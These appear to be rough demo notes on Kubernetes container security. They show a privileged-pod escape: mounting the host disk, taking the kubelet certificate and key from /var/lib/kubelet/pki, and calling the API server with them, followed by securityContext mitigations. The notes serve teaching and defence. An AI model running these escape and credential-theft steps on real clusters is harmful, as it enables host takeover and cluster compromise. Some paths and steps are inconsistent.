
## Deploy privileged container

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: nginx
  labels:
    app: nginx
spec:
  containers:
  - name: nginx
    image: nginx
```
## Verify that root on container is root on host

ssh into the node
```
minikube ssh
```
find the currently running sleep processes

```
ps -C sleep -o user,uid,cmd
```

Connect to the container and run `sleep 100` the verify that the node has another sleep process with root user

## Change host name

Running `hostname newname` will fail because although the container is running using root account, the root has limited set of linux capabilities that can't be increased

In order to increate those capabilities, let's modify the pod to include 
```yaml
securityContext:
      privileged: true
```

now changing the host name with `hostname newname` will work

## Escape the container `mount` host

Running the `df` command will show the disks and now I can mount to the host using 

```
mkdir /host
mount /dev/sda1 /host
```

now navigating to the directory `/tmp/host/var/lib/kubelet/pki` we can find the kubelet certificate which we can use and call the api server


## Mitigate the risks by using security context

### runAsUser => sleep

Using the runAsUser parameter you can modify the user ID of the processes inside a container.

### fsGroup => write file

Any file you create inside the /data/demo volume will use GID 2000 (due to the fsGroup parameter).

### allowPrivilegeEscalation = false

means the container cannot escalate privileges
The execve system call can grant a newly-started program privileges that its parent did not have, such as the setuid or setgid Linux flags. This is controlled by the AllowPrivilegeEscalation boolean and should be used with care and only when required.

### ReadOnlyRootFilesystem = true /No Demo

means the container can only read the root filesystem


- capsh --print | grep Current

- write file 
- mount host files
- 

echo "<img src=\"lack-of-security.jpg\" />" >> index.html


kubectl get pods --client-certificate=kubelet.crt --client-key=kubelet.key